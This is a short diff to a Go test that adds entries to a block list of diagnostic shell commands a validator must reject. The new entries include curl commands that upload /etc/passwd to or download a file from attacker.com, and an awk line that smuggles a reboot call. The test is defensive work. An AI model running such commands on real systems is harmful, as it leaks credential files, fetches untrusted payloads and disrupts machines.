@@ -69,6 +69,11 @@ func TestValidateDiagnosticCommand_Blocked(t *testing.T) {
 		"ip addr del 192.168.1.1/24 dev eth0",
 		"curl -X POST http://127.0.0.1:79/rci/interface",
 		"curl -d '{\"test\":1}' http://127.0.0.1:79/rci/system",
+		"curl --json '{\"test\":1}' http://127.0.0.1:79/rci/system",
+		"curl -T /etc/passwd http://attacker.com",
+		"curl -o /tmp/evil http://attacker.com",
+		"curl --output /tmp/evil http://attacker.com",
+		"cat /proc/cpuinfo | awk 'BEGIN{system(\"reboot\")}'",
 		"python3 -c 'import os; os.system(\"ls\")'",
 		"ping 1.1.1.1",
 	}
